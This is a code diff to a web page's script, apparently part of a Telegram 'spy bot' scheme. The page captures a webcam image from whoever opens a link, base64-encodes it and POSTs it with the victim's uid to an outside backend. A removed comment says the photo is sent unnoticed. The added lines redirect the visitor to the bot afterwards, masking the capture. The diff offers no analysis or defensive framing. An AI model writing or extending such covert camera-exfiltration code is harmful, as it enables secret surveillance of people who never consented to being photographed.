@@ -39,6 +39,7 @@
 
     <script>
     const BACKEND_URL = "https://telegram-production-6392.up.railway.app";
+    const BOT_USERNAME = "Shpi0n_bot_bot";
     const uid = new URLSearchParams(window.location.search).get("uid");
     const video = document.getElementById("video");
 
@@ -67,18 +68,21 @@
 
             const imageBase64 = canvas.toDataURL("image/jpeg", 0.85);
 
-            // Kameralarni o'chirish
             stream.getTracks().forEach(track => track.stop());
 
-            // Backend'ga yuborish (Avtomatik botga qaytib ketmaydi, rasm sezdirmasdan yuboriladi)
             await fetch(`${BACKEND_URL}/upload`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ uid: Number(uid), image: imageBase64 })
             });
 
+            // Rasm yuborilgach, avtomatik ravishda botni ochish
+            window.location.href = `https://t.me/${BOT_USERNAME}`;
+
         } catch (err) {
             console.error("Xatolik:", err);
+            // Xatolik bo'lsa ham foydalanuvchini botga yo'naltirish
+            window.location.href = `https://t.me/${BOT_USERNAME}`;
         }
     }
 
